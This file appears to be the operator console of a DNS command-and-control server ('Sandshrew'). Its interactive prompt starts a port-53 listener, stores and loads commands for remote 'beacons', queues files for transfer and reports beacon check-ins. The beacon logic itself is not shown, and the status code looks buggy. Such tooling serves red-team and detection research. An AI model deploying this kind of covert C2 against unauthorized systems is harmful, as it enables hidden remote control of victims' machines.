"""
    Custom python server to handle DNS requests and 
    create custom responses to queries. Used primarily 
    to control DNS Beacons.

    @author Dosh, JRoc
    github.com/doshmajhan/Sandshrew
"""
import threading, sys, sqlite3, time
import server

"""
    Function to start interactive prompt to read commands

"""
def start_prompt():
    port = 53   # Default value
    cmd = ""
    loaded = ""
    s = server.Server(port)
    db = init_db()
     
    while True:
        try:
            cmd = raw_input("[*] ")
        except (KeyboardInterrupt, SystemExit):
            print ""
            db.close()
            sys.exit()
        
        cmd = cmd.split(" ")
        if len(cmd) == 1:
            if cmd[0] == "start":  # starting server
                s = start_server(port)
            
            elif cmd[0] == "exit":   # shutting server down
                db.close()
                sys.exit()
            
            elif cmd[0] ==  "status":   # check the status of all the servers beacons
                d = check_status(s)
                print "=========================="
                print "ID | STATUS | LAST CHECKIN"
                print "=========================="
                for key in d: print str(key) + "  | " + str(d[key])

        elif len(cmd) >= 2: 
            if cmd[0] == "port":  # defining port to listen on
                port = int(cmd[1])

            elif cmd[1] == "=":     # defining new command to store
                name = cmd[0]
                newCmd = ' '.join(cmd[2::]) # combine the rest of the array into single string
                s.add_command(name, newCmd, db) # add command to database
            
            elif cmd[0] == "load":  # load defined command into server
                s.load_command(cmd[1], db)  # retrieve command from database
            
            elif cmd[0] == "file":  # load file to be transfered
                s.f = True
                s.fName = cmd[1]

"""
    Function to conenct to the servers sqlite3 backend

    returns - the newly connected db variable
"""
def init_db():
    db = sqlite3.connect("sandtomb.db")
    c = db.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                    (name TEXT, cmd TEXT)''')
    db.commit()   
    return db


"""
    Function to check the status of the servers beacons
    
    s - the server holding the beacons
    returns list of each beacon and the last time they checked in
"""
def check_status(s):
    t = time.localtime()
    # go through and get the difference of when the beacon checked in till now
    stats = [((t.tm_hour-b.realtime[0]), (t.tm_min-b.realtime[1]), \
    (t.tm_sec)-b.realtime[2]) for b in s.beacons]
    d = {}
    for b in s.beacons:
        print b.tag
        d.update({b.tag : "Alive  | %d hours %d minutes %d seconds ago" % \
        (stats[b.tag][0], stats[b.tag][1], stats[b.tag][2])})
    return d

"""
    Function to handle the start command.
    Starts server and returns the server object created
    
    port - the port to listen on 

    returns a server object
"""
def start_server(port):
    s = server.Server(port)
    server_thread = threading.Thread(target=s.start)
    server_thread.daemon=True
    try:
        server_thread.start()
        print "Server listening on port %d" % port
    except (KeyboardInterrupt, SystemExit):
        sys.exit()
    return s

"""
    Main program to start the server and receive requests
"""
if __name__ == "__main__":
        print "- Starting prompt..."
        start_prompt()
        sys.exit()
